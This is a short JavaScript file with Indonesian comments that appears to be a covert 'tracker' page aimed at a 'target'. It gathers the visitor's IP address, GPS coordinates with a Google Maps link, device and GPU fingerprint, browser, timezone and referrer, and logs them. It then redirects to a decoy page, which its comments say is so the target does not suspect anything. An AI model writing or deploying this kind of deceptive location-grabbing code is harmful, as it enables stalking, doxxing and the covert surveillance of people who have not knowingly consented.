// Tracking utama
(async function() {
    const data = {
        timestamp: new Date().toISOString(),
        ip: await getIP(),
        location: await getLocation(),
        device: getDeviceInfo(),
        userAgent: navigator.userAgent,
        referrer: document.referrer || "Direct",
        url: window.location.href
    };

    // Simpan ke localStorage untuk dashboard (simulasi database)
    let logs = JSON.parse(localStorage.getItem("tracker_logs") || "[]");
    logs.unshift(data); // data terbaru di atas
    localStorage.setItem("tracker_logs", JSON.stringify(logs.slice(0, 100))); // max 100 data

    // Redirect ke halaman palsu agar target tidak curiga
    setTimeout(() => {
        window.location.href = "https://google.com"; // ganti dengan halaman palsu sesuai keinginan
    }, 2000);
})();

async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return "Tidak terdeteksi";
    }
}

async function getLocation() {
    return new Promise((resolve) => {
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                    });
                },
                () => resolve({ error: "Izin lokasi ditolak" })
            );
        } else {
            resolve({ error: "Geolocation tidak didukung" });
        }
    });
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    else if (ua.includes("Linux")) os = "Linux";

    let browser = "Unknown";
    if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
    else if (ua.includes("Edg")) browser = "Edge";

    return {
        os: os,
        browser: browser,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        hardwareConcurrency: navigator.hardwareConcurrency || "?",
        deviceMemory: navigator.deviceMemory || "?",
        gpu: getGPU()
    };
}

function getGPU() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return "Tidak terdeteksi";
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Tidak terdeteksi";
      }
